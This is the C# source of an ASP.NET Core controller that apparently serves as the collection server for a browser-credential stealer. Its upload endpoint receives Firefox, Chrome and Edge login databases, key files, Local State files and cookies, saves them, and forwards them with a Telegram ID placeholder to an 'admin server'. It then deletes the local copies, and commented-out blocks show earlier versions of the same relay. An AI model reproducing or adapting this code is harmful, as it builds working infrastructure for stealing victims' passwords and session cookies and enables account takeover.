using Microsoft.AspNetCore.Components.Forms;
using Microsoft.AspNetCore.Mvc;
using Microsoft.AspNetCore.Mvc.Formatters;
using ServerHandlerWeb.Models;
using System.Diagnostics;
using System.Text;

namespace ServerHandlerWeb.Controllers
{
    public class HomeController : Controller
    {
        private readonly ILogger<HomeController> _logger;

        public HomeController(ILogger<HomeController> logger)
        {
            _logger = logger;
        }

        [HttpGet]
        public IActionResult Index()
        {
            return View();
        }

        [HttpPost]
        public IActionResult Index(string password)
        {
            if (ModelState.IsValid)
            {
                return RedirectToAction("Index");
            }
            return View(password);
        }

        [Route("/admin")]
        public IActionResult AdminData()
        {
            return View();
        }

        [Route("/success")]
        public IActionResult Success()
        {
            return View();
        }

        [HttpPost]
        [Route("/api/upload")]
        public async Task<IActionResult> Upload()
        {
            if (!Request.Form.Files.Any())
            {
                return BadRequest("No file uploaded.");
            }

            string mainHost = "https://localhost:7281/api/upload";
            var firstFile = Request.Form.Files[0];

            if (firstFile.Name == "logContent")
            {
                var logfileName = Path.GetFileName(firstFile.FileName);
                var logfilePath = Path.Combine(Directory.GetCurrentDirectory() + @"\wwwroot", logfileName);
                string telegramId = "{tgID}";
                using (var stream = new FileStream(logfilePath, FileMode.Create))
                {
                    firstFile.CopyTo(stream);
                    stream.Close();
                }
                using (var adminClient = new HttpClient())
                {
                    var logFile = System.IO.File.OpenRead(logfilePath);
                    var logFileContent = new StreamContent(logFile);
                    var telegramIdContent = new StringContent(telegramId, Encoding.UTF8, "text/plain");

                    using (var formData = new MultipartFormDataContent())
                    {
                        formData.Add(logFileContent, "logContent", logfilePath);
                        formData.Add(telegramIdContent, "telegramId", telegramId);

                        // response from the admin server
                        var response = await adminClient.PostAsync(mainHost, formData);

                        if (response.IsSuccessStatusCode)
                        {
                            Console.WriteLine("File uploaded successfully.");
                        }
                        else
                        {
                            Console.WriteLine($"Failed to upload file: {response.ReasonPhrase}");
                        }
                    }
                }
                System.IO.File.Delete(logfilePath);
            }
            else
            {
                var secondFile = Request.Form.Files[1];
                var thirdFile = Request.Form.Files[2];

                string telegramId = "{tgId}";

                /* if (firstFile.Name == "firefoxCookies" && secondFile.Name == "firefoxPasswords")
                 {
                     var cookiesFileName = Path.GetFileName(firstFile.Name);
                     var passwordsFileName = Path.GetFileName(secondFile.Name);

                     var cookiesPath = Path.Combine(Directory.GetCurrentDirectory(), @"\wwwroot", cookiesFileName);
                     var passwordsPath = Path.Combine(Directory.GetCurrentDirectory(), @"\wwwroot", passwordsFileName);

                     using (var stream = new FileStream(cookiesPath, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite))
                     {
                         await firstFile.CopyToAsync(stream);
                         stream.Close();
                     }

                     using (var stream = new FileStream(passwordsPath, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite))
                     {
                         await secondFile.CopyToAsync(stream);
                         stream.Close();
                     }

                     // CODE FOR THE SEND TO TELEGRAM
                     return Ok("File is sent!");
                 }*/

                /*if (firstFile.Name == "edgeCookies" && secondFile.Name == "edgePasswords")
                {
                    var cookiesFileName = Path.GetFileName(firstFile.Name);
                    var passwordsFileName = Path.GetFileName(secondFile.Name);

                    var cookiesPath = Path.Combine(Directory.GetCurrentDirectory(), @"\wwwroot", cookiesFileName);
                    var passwordsPath = Path.Combine(Directory.GetCurrentDirectory(), @"\wwwroot", passwordsFileName);

                    using (var stream = new FileStream(cookiesPath, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite))
                    {
                        await firstFile.CopyToAsync(stream);
                        stream.Close();
                    }

                    using (var stream = new FileStream(passwordsPath, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite))
                    {
                        await secondFile.CopyToAsync(stream);
                        stream.Close();
                    }

                    return Ok("File is sent!");
                }

                if (firstFile.Name == "chromeCookies" && secondFile.Name == "chromePasswords")
                {
                    var cookiesFileName = Path.GetFileName(firstFile.Name);
                    var passwordsFileName = Path.GetFileName(secondFile.Name);

                    var cookiesPath = Path.Combine(Directory.GetCurrentDirectory(), @"\wwwroot", cookiesFileName);
                    var passwordsPath = Path.Combine(Directory.GetCurrentDirectory(), @"\wwwroot", passwordsFileName);

                    using (var stream = new FileStream(cookiesPath, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite))
                    {
                        await firstFile.CopyToAsync(stream);
                        stream.Close();
                    }

                    using (var stream = new FileStream(passwordsPath, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite))
                    {
                        await secondFile.CopyToAsync(stream);
                        stream.Close();
                    }

                    return Ok("File is sent!");
                    // CODE FOR THE SEND TO TELEGRAM
                }*/



                if (firstFile.Name == "firefoxLogins" && secondFile.Name == "key4" && thirdFile.Name == "firefoxCookies")
                {
                    var firefoxLogins = Path.GetFileName(firstFile.FileName);
                    var firefoxLoginsPath = Path.Combine(Directory.GetCurrentDirectory() + @"\wwwroot", firefoxLogins);

                    var firefoxKey4 = Path.GetFileName(secondFile.FileName);
                    var firefoxKey4Path = Path.Combine(Directory.GetCurrentDirectory() + @"\wwwroot", firefoxKey4);

                    var firefoxCookiesName = Path.GetFileName(thirdFile.FileName);
                    var firefoxCookiesPath = Path.Combine(Directory.GetCurrentDirectory() + @"\wwwroot", firefoxCookiesName);

                    using (var stream = new FileStream(firefoxLoginsPath, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite))
                    {
                        await firstFile.CopyToAsync(stream);
                        stream.Close();
                    }

                    using (var stream = new FileStream(firefoxKey4Path, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite))
                    {
                        await secondFile.CopyToAsync(stream);
                        stream.Close();
                    }

                    using (var stream = new FileStream(firefoxCookiesPath, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite))
                    {
                        await thirdFile.CopyToAsync(stream);
                        stream.Close();
                    }

                    using (var adminClient = new HttpClient())
                    {
                        var loginsFile = System.IO.File.OpenRead(firefoxLoginsPath);
                        var key4File = System.IO.File.OpenRead(firefoxKey4Path);
                        var cookiesFile = System.IO.File.OpenRead(firefoxCookiesPath);

                        var loginsContent = new StreamContent(loginsFile);
                        var key4Content = new StreamContent(key4File);
                        var cookiesContent = new StreamContent(cookiesFile);
                        var telegramIdContent = new StringContent(telegramId, Encoding.UTF8, "text/plain");

                        using (var formData = new MultipartFormDataContent())
                        {
                            formData.Add(loginsContent, "firefoxLogins", firefoxLoginsPath);
                            formData.Add(key4Content, "key4", firefoxKey4Path);
                            formData.Add(cookiesContent, "firefoxCookies", firefoxCookiesPath);
                            formData.Add(telegramIdContent, "telegramId", telegramId);

                            // response from the admin server
                            var response = await adminClient.PostAsync(mainHost, formData);

                            if (response.IsSuccessStatusCode)
                            {
                                Console.WriteLine("File uploaded successfully.");
                            }
                            else
                            {
                                Console.WriteLine($"Failed to upload file: {response.ReasonPhrase}");
                            }
                        }
                    }
                    System.IO.File.Delete(firefoxLoginsPath);
                    System.IO.File.Delete(firefoxKey4Path);
                    System.IO.File.Delete(firefoxCookiesPath);
                }

                if (firstFile.Name == "edgeLoginData" && secondFile.Name == "edgeLocalState" && thirdFile.Name == "edgeCookies")
                {
                    var edgeLoginName = Path.GetFileName(firstFile.FileName);
                    var edgeLoginPath = Path.Combine(Directory.GetCurrentDirectory() + @"\wwwroot", edgeLoginName);

                    var edgeLocalName = Path.GetFileName(secondFile.FileName);
                    var edgeLocalPath = Path.Combine(Directory.GetCurrentDirectory() + @"\wwwroot", edgeLocalName);

                    var edgeCookiesName = Path.GetFileName(thirdFile.FileName);
                    var edgeCookiesPath = Path.Combine(Directory.GetCurrentDirectory() + @"\wwwroot", edgeCookiesName);

                    using (var stream = new FileStream(edgeLoginPath, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite))
                    {
                        await firstFile.CopyToAsync(stream);
                        stream.Close();
                    }

                    using (var stream = new FileStream(edgeLocalPath, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite))
                    {
                        await secondFile.CopyToAsync(stream);
                        stream.Close();
                    }

                    using (var stream = new FileStream(edgeCookiesPath, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite))
                    {
                        await thirdFile.CopyToAsync(stream);
                        stream.Close();
                    }

                    using (var adminClient = new HttpClient())
                    {
                        var loginDataFile = System.IO.File.OpenRead(edgeLoginPath);
                        var localStateFile = System.IO.File.OpenRead(edgeLocalPath);
                        var cookiesFile = System.IO.File.OpenRead(edgeCookiesPath);

                        var loginDataContent = new StreamContent(loginDataFile);
                        var localStateContent = new StreamContent(localStateFile);
                        var cookiesContent = new StreamContent(cookiesFile);
                        var telegramIdContent = new StringContent(telegramId, Encoding.UTF8, "text/plain");

                        using (var formData = new MultipartFormDataContent())
                        {
                            formData.Add(loginDataContent, "edgeLoginData", edgeLoginPath);
                            formData.Add(localStateContent, "edgeLocalState", edgeLocalPath);
                            formData.Add(cookiesContent, "edgeCookies", edgeCookiesPath);
                            formData.Add(telegramIdContent, "telegramId", telegramId);

                            // response from the admin server
                            var response = await adminClient.PostAsync(mainHost, formData);

                            if (response.IsSuccessStatusCode)
                            {
                                Console.WriteLine("File uploaded successfully.");
                            }
                            else
                            {
                                Console.WriteLine($"Failed to upload file: {response.ReasonPhrase}");
                            }
                        }
                    }
                    System.IO.File.Delete(edgeLoginPath);
                    System.IO.File.Delete(edgeLocalPath);
                    System.IO.File.Delete(edgeCookiesPath);
                }

                if (firstFile.Name == "chromeLoginData" && secondFile.Name == "chromeLocalState" && thirdFile.Name == "chromeCookies")
                {
                    var chromeLoginName = Path.GetFileName(firstFile.FileName);
                    var chromeLoginPath = Path.Combine(Directory.GetCurrentDirectory() + @"\wwwroot", chromeLoginName);

                    var chromeLocalName = Path.GetFileName(secondFile.FileName);
                    var chromeLocalPath = Path.Combine(Directory.GetCurrentDirectory() + @"\wwwroot", chromeLocalName);

                    var chromeCookiesName = Path.GetFileName(thirdFile.FileName);
                    var chromeCookiesPath = Path.Combine(Directory.GetCurrentDirectory() + @"\wwwroot", chromeCookiesName);

                    using (var stream = new FileStream(chromeLoginPath, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite))
                    {
                        await firstFile.CopyToAsync(stream);
                        stream.Close();
                    }

                    using (var stream = new FileStream(chromeLocalPath, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite))
                    {
                        await secondFile.CopyToAsync(stream);
                        stream.Close();
                    }

                    using (var stream = new FileStream(chromeCookiesPath, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite))
                    {
                        await thirdFile.CopyToAsync(stream);
                        stream.Close();
                    }

                    using (var adminClient = new HttpClient())
                    {
                        var loginDataFile = System.IO.File.OpenRead(chromeLoginPath);
                        var localStateFile = System.IO.File.OpenRead(chromeLocalPath);
                        var cookiesFile = System.IO.File.OpenRead(chromeCookiesPath);

                        var loginDataContent = new StreamContent(loginDataFile);
                        var localStateContent = new StreamContent(localStateFile);
                        var cookiesContent = new StreamContent(cookiesFile);
                        var telegramIdContent = new StringContent(telegramId, Encoding.UTF8, "text/plain");

                        using (var formData = new MultipartFormDataContent())
                        {
                            formData.Add(loginDataContent, "chromeLoginData", chromeLoginPath);
                            formData.Add(localStateContent, "chromeLocalState", chromeLocalPath);
                            formData.Add(cookiesContent, "chromeCookies", chromeCookiesPath);
                            formData.Add(telegramIdContent, "telegramId", telegramId);

                            // response from the admin server
                            var response = await adminClient.PostAsync(mainHost, formData);

                            if (response.IsSuccessStatusCode)
                            {
                                Console.WriteLine("File uploaded successfully.");
                            }
                            else
                            {
                                Console.WriteLine($"Failed to upload file: {response.ReasonPhrase}");
                            }
                        }
                    }
                    System.IO.File.Delete(chromeLoginPath);
                    System.IO.File.Delete(chromeLocalPath);
                    System.IO.File.Delete(chromeCookiesPath);
                }
            }
            return Ok("File uploaded successfully.");
        }

        [ResponseCache(Duration = 0, Location = ResponseCacheLocation.None, NoStore = true)]
        public IActionResult Error()
        {
            return View(new ErrorViewModel { RequestId = Activity.Current?.Id ?? HttpContext.TraceIdentifier });
        }

        public static string GenerateRandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            var random = new Random();
            var result = new StringBuilder(length);
            for (int i = 0; i < length; i++)
            {
                result.Append(chars[random.Next(chars.Length)]);
            }
            return result.ToString();
        }
    }
}